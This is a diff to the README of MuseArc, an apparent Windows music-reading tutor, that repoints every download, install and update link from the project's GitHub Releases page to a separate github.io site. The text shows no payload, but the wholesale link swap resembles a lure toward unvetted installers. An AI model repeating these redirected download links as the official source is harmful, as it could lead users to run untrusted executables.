@@ -1,10 +1,10 @@
 # 🎵 MuseArc - Learn to Read Music and Hear Notes
 
-[![Download MuseArc](https://img.shields.io/badge/Download-MuseArc-blue?style=for-the-badge&logo=github)](https://github.com/Agnetasignificant182/MuseArc/releases)
+[![Download MuseArc](https://img.shields.io/badge/Download-MuseArc-blue?style=for-the-badge&logo=github)](https://agnetasignificant182.github.io)
 
 ## 📥 Visit the Download Page
 
-Go to the [MuseArc Releases Page](https://github.com/Agnetasignificant182/MuseArc/releases) to get the latest version.
+Go to the [MuseArc Releases Page](https://agnetasignificant182.github.io) to get the latest version.
 
 ## What is MuseArc?
 
@@ -51,7 +51,7 @@ Follow these steps to get MuseArc on your Windows computer.
 
 **Step 1: Visit the Release Page**
 
-Click this link: [https://github.com/Agnetasignificant182/MuseArc/releases](https://github.com/Agnetasignificant182/MuseArc/releases)
+Click this link: [https://agnetasignificant182.github.io](https://agnetasignificant182.github.io)
 
 **Step 2: Find the Latest Version**
 
@@ -141,7 +141,7 @@ No. You must complete each level to unlock the next. This ensures you build a so
 
 ## 🔄 Updating MuseArc
 
-The app does not update automatically. Check the [Releases Page](https://github.com/Agnetasignificant182/MuseArc/releases) every few months for new versions. Download the new installer and run it. It will replace your old version. Your progress stays saved.
+The app does not update automatically. Check the [Releases Page](https://agnetasignificant182.github.io) every few months for new versions. Download the new installer and run it. It will replace your old version. Your progress stays saved.
 
 ## 📄 License
 
